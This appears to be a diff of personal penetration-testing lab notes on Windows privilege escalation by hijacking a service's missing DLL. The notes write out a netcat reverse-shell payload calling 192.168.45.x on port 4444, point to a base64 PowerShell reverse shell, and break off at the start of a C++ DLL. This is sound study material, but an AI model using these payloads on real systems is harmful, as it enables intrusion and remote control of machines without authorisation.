@@ -1010,7 +1010,7 @@ PS C:\Users\alex> dir c:\services\
 		-ar---         7/17/2019   2:31 AM          59392 nc.exe
 
 PS C:\Users\alex> type C:\services\EnterpriseServiceLog.log
-	[00:00:00.000] (c2c) WARN   Couldn't load EnterpriseServiceOptional.dll, only using basic features.
+	[00:00:00.000] (c2c) WARN   Couldn''t load EnterpriseServiceOptional.dll, only using basic features.
 
 
 # Download dll replacement to path where service starts from, and restart service
@@ -1022,6 +1022,8 @@ PS C:\Users\alex> Restart-Service EnterpriseService
 	- try a different thing for dll.
 
 - GoTo revshells.com and grab the powershell base64 encode and use that for the `i = system("<powershell reverse shell base64 encoded")` payload
+	- Should probably attempt using `i = system("C:\\Services\\nc64.exe 192.168.45.x 4444 -e powershell");`
+		- I didn't escape the `\`, and it kept throwing errors, so went with the ps base64 shell. Need to attempt again w/ the escaped `\\`
 ```c++
 # include <stdlib.h>
 # include <windows.h>
